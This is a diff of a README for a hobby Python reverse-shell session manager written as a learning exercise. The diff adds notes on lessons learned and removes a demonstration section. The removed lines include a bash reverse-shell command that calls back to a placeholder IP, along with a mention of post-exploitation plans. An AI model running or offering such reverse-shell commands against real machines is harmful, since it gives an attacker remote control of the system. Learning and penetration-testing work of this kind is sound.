@@ -1,4 +1,4 @@
-# Automatic Goggles
+# Automatic Goggles (Revamped)
 
 Automatic googles is a program that allows you to manage multiple remote sessions on other machines. It allows you to switch between sessions and run commands on target machines.
 
@@ -11,41 +11,12 @@ Automatic googles is a program that allows you to manage multiple remote session
 - [I learned about the different methods of sending reverse shells.](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - I learned more about programming in python and developed useful skill in regards to building larger programs. 
 
+### Thinks I learned from the revamp
+- Writing cleaner, more consise python code. 
+- A better understanding of sockets and network connections.
+- Code organization.
+- Inheritance (even though it is not present in the project)
+
 ## Future Additions
 - Upload/Download files.
-- Some automation with Post-Exploitation.
 
-## Current issues
-- When you are in a shell running commands, you have to hit enter twice for the command to actually run and receive output. 
-- Many other error handling things I need to go in and do. 
-
-## Demonstration
-
-Starting a listener for the connection...
-
-![listen](pics/listen.png "Listener setup")
-
-Recieving connection from compromised host (my helpful friend Josh Hammrich)...
-
-Reverse shell method used -> `bash -i >& /dev/tcp/<myip>/1337 0>&1`
-
-![receive](pics/recieved_connection.png "Recieving Connection")
-
-Dropping into a shell on the new session...
-
-![shell](pics/connecting_to_shell.png "Connecting to session")
-
-Executing commands...
-
-![cmdexec](pics/code_execution.png "Executing 'whoami'")
-
-Killing connection...
-
-![kill](pics/kill_connection.png "Killing the spawned session")
-
-Running local commands inside of automatic-goggles...
-
-![local](pics/local_command_run.png "Running 'ls' locally")
-
-***
-While there is practical use for this project, I will probably just stick with metasploit :) This was for learning experiences and I will continue to work on it and add things when I get ideas and find time!
